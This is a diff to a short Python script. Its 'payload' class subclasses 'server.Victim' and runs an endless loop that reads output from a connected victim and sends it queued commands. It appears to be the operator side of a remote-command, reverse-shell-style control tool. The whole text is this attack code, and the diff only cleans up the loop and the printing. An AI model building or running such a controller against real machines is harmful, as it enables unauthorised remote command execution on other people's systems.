@@ -1,19 +1,18 @@
 #!/usr/bin/env python3
 import server; 
-import string;
 import sys
+import functools
 
+print = functools.partial(print, flush=True)
 class payload(server.Victim):
     def run(self):
-        while(True):
-            encoded = self.secure_recv()
-            print(encoded.decode('utf-8')
-          #  print("".join(filter(lambda x: x in string.printable, str(self.secure_recv(),'ascii'))),end="")
-            Command = str(self.getCommandFromQueue())
-            print(Command)
-            self.secure_send(Command.encode("utf8"),len(Command.encode("utf8")))
-            
+     #  print(str(self.secure_recv()))
+     #   self.secure_send(bytearray(b'hello world'),11)
+     #   self.secure_send(bytearray(b'hello world this is the server'),30)
+        while True:
+            print(str(self.secure_recv().decode()))
+            command = str(self.getCommandFromQueue())
+            print(command)
+            self.secure_send(command.encode(),len(command.encode()))
 if __name__ == "__main__":
     server.run(payload)
-
-
